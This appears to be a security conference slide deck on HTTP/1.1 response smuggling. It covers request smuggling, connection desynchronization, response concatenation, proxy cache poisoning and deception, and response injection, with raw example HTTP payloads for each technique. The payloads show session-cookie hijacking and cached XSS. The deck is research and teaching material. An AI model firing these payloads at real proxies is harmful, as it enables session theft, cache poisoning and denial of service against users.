# Response Smuggling: Pwning HTTP/1.1 Connections

## Agenda
- **HTTP Request Smuggling**
- **Desynchronization Variants**
- **Response Smuggling**
- **Response Concatenation**
- **Arbitrary Proxy Cache Poisoning/Deception**
- **Response Scripting**

## HTTP Request Smuggling

### Introduction
- **Attack Origin**: Introduced in 2005 by Watchfire.
- **Mechanism**: Exploits discrepancies between front-end and back-end servers.
- **Technique**: Uses multiple message-length directives in a single request.

#### Example
```http
GET /example HTTP/1.1
Host: www.vulnerable.com
Content-Length: 32
Content-Length: 5
AAAAAGET /DeleteMyAccount HTTP/1.1
X: GET /myAccount HTTP/1.1
Host: www.vulnerable.com
Cookie: sessionID=1234
```

### Desynchronization Variants
- **Forcing Discrepancies**: Techniques to create mismatches between servers.
- **Hidden Headers**: Headers that are not parsed by HTTP parsers.
- **Rediscovery**: Reintroduced in 2019 by James Kettle.
- **Methodology**: Detect, Confirm, Explore, Exploit.
- **Real-World Impact**: Demonstrated on real systems, leading to bounties.

### Connection Desynchronization
- **Header Types**: End-to-End vs. Hop-by-Hop headers.
- **Connection Header**: `Connection: Connection_Option` with directives like "close" or "keep-alive".
- **Forwarding Behavior**: Connection headers are deleted when forwarded.

#### Example
```http
GET /Hello HTTP/1.1
Host: www.vulnerable.com
Connection: Content-Length
Content-Length: 13
SMUGGLED_DATA
```

### Request Smuggling Exploitation
- **Bypass Front-End Controls**: Not limited to authentication.
- **Request Hijacking**: Possible if data is stored and retrieved.
- **Vulnerability Amplification**: Upgrades existing issues like XSS and Open-Redirect.
- **Web Cache Attacks**: Ignores Cache-Control directives.

## Response Smuggling

### Introduction
- **Injection**: Injects a complete message into the response queue.
- **Techniques**: Combines HTTP desynchronization and response splitting.
- **Proxy Failure**: Proxy fails to match requests with corresponding responses.

#### Example
```http
GET /example HTTP/1.1
Host: www.vulnerable.com
GET /hello HTTP/1.1
Host: www.vulnerable.com
POST /LoginAction HTTP/1.1
Host: www.vulnerable.com
User=admin&pass=abc123
```

### HTTP Pipelining
- **Pipelining Enforcement**: Not always enforced.
- **Free Connections**: Sends through available connections.
- **MaxConn Handling**: Pipelines or waits if maximum connections are reached.
- **Response Storage**: Responses are not stored; connection is closed.

### Nested Smuggled Requests
- **Multiple Injections**: Smuggle more than one request.
- **Payload Distribution**: Distributes malicious payloads (e.g., N XSS requests).
- **Denial of Service**: One request can produce N responses.
- **Resource Consumption**: Consumes proxy connections and backend resources (CPU, Memory).

### Request Hijacking
- **Reflection**: Request content reflected in victim’s response without storage.
- **Desynchronization**: Used to obtain victim’s response.

#### Example
```http
GET /example HTTP/1.1
Host: www.vulnerable.com
GET /sleepy HTTP/1.1
Host: www.vulnerable.com
POST /reflect HTTP/1.1
Host: www.vulnerable.com
Content-Length: 100000
ReflectedContent=GET /myAccount HTTP/1.1
Cookie: SecretSessionCookie=ABCDEF1234
```

## Response Concatenation

### Response Length
- **RFC Compliance**: Some messages must not contain a body (e.g., HEAD requests).
- **Content-Length**: Allowed and must match the GET value.

### What if a Proxy Fails to Match Responses?
- **Building Blocks**: Responses are concatenated.
- **Splitting**: Last response is built using remaining bytes.

#### Example
```http
GET /example HTTP/1.1
Host: www.vulnerable.com
HEAD /HelloWorld HTTP/1.1
Host: www.vulnerable.com
GET /HelloWorld HTTP/1.1
Host: www.vulnerable.com
GET /somePage HTTP/1.1
Host: www.vulnerable.com
```

### Content Confusion
- **Headers as Body**: Headers used as the body.
- **Data Reflection**: Data reflected in headers, leading to XSS.
- **Content-Type**: Specified by HEAD response.
- **Safe Responses**: Reflection in "safe" responses (text/plain, application/json).

#### Example
```http
HEAD /welcomePage HTTP/1.1
Host: www.vulnerable.com
GET /redir? HTTP/1.1
Host: www.vulnerable.com
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 100
HTTP/1.1 302 Found
Location: 
www.vulnerable.com?
```

## Arbitrary Proxy Cache Poisoning/Deception

### Proxy Cache Poisoning
- **Cache-Control**: Proxy cache uses the Cache-Control header.
- **Pipelining**: No need for a time-consuming request.

#### Example
```http
GET /example HTTP/1.1
Host: www.vunerable.com
Content-Length: 54
Connection: Content-Length
HEAD /home.html HTTP/1.1
Host: www.vulnerable.com
POST /redirect HTTP/1.1
Host: www.vulnerable.com
Content-Length: 33
ref=
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 18
This is an example
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=7200
Content-Length: 77
HTTP/1.1 302 Found
Location: 
www.vulnerable.com/alert(‘XSS’)
```

### Proxy Cache Deception
- **Poisoned Cache**: Cache gets poisoned by the Cache-Control header.
- **Arbitrary URLs**: Any URL can be poisoned.
- **Payloads**: Cached responses can contain XSS, Open Redirect, XSRF.
- **DoS**: Can poison all URLs with static 404 responses.

#### Example
```http
GET /example HTTP/1.1
Host: www.vunerable.com
Content-Length: 54
Connection: Content-Length
HEAD /home.html HTTP/1.1
Host: www.vulnerable.com
GET /myAccount HTTP/1.1
Host: www.vulnerable.com
Cookie: mySessionCookie=abc123
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=7200
Content-Length: 77
HTTP/1.1 200 OK
Content-Type: text/html
Hello Victim
Secret Data: ...
```

## Arbitrary Response Injection

### Response Splitting
- **Injection**: Injects arbitrary responses.

#### Example
```http
GET /example HTTP/1.1
Host: www.vulnerable.com
Connection: Content-Length
Content-Length: 241
HEAD /HelloWorld HTTP/1.1
Host: www.vulnerable.com
POST /reflection HTTP/1.1
Host: www.vulnerable.com
Content-Length: 137
ReflectedParam=AAAAAAAAAHTTP/1.1 OK 200
Cache-Control: max-age=9000
Content-Type: text/html
Content-Length: 20
Arbitrary Response
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 100
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length:120
Your parameter input was: AAAAAAAAAHTTP/1.1 
OK 200
Cache-Control: max-age=9000
Content-Type: text/html
Content-Length: 20
Arbitrary Response
```

## Conclusions
- **Independence**: Response smuggling does not rely on extra vulnerabilities.
- **Confidentiality**: Response/request hijack compromises confidentiality.
- **Availability**: Proxy cache poisoning and nested injection compromise availability.
- **Integrity**: Response scripting and request smuggling compromise integrity.
- **Complete Compromise**: Arbitrary response writing plus cache can fully compromise clients.
- **Reliability**: Sleepy requests and timing increase reliability.

## Questions?

**Contact Information:**
- **Twitter**: @tincho_508
- **Email**: [PI:EMAIL]